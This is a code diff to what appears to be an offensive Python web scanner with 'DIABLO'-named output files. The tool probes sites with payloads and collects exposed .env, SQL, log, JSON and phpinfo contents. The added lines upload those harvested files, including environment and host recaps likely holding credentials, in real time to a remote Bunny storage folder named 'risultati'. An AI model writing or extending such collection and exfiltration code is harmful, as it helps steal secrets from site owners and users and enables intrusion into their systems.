@@ -509,6 +509,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                         json_content_dict = json.loads(contentsx)
                         with open(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'a', encoding='utf-8') as f:
                             f.write(f'{json_content_dict}\n')
+                        upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'risultati/DIABLO_JSON.txt')
                     except: pass
                     
                 regex_found = False
@@ -584,6 +585,25 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                         if saved_file_path and remote_subpath:
                             upload_file_to_bunny(saved_file_path, remote_subpath)
                             
+                        # Carica anche i file aggregati principali nella cartella risultati/
+                        if is_json_file:
+                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'risultati/DIABLO_JSON.txt')
+                        elif is_env_file:
+                            upload_file_to_bunny(myfile_checktmobilephps, 'risultati/DIABLO_ENV_NEW.txt')
+                        elif url_lower.endswith('.js'):
+                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_JS.txt'), 'risultati/DIABLO_JS.txt')
+                        elif url_lower.endswith('.xml'):
+                            upload_file_to_bunny(myfile_checkxml, 'risultati/DIABLO_XML.txt')
+                        elif url_lower.endswith('.log'):
+                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_LOG.txt'), 'risultati/DIABLO_LOG.txt')
+                        elif url_lower.endswith('.sql'):
+                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_SQL.txt'), 'risultati/DIABLO_SQL.txt')
+                        else:
+                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_OTHER.txt'), 'risultati/DIABLO_OTHER.txt')
+                            
+                        # Carica sempre il file di recap env/host
+                        upload_file_to_bunny(myfile_checktmobileprv, 'risultati/DIABLO_ENV.txt')
+                            
                     try:
                         html_content = r.text
                         soup = BeautifulSoup(html_content, "html.parser")
@@ -613,6 +633,8 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                     
                                     # Carica in tempo reale il file su Bunny
                                     upload_file_to_bunny(saved_php_path, f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix_php}.txt")
+                                    upload_file_to_bunny(myfile_checktmobilephp, 'risultati/DIABLO_PHPINFO.txt')
+                                    upload_file_to_bunny(myfile_checktmobileprv, 'risultati/DIABLO_ENV.txt')
                     except: pass
                 try: r.close()
                 except: pass
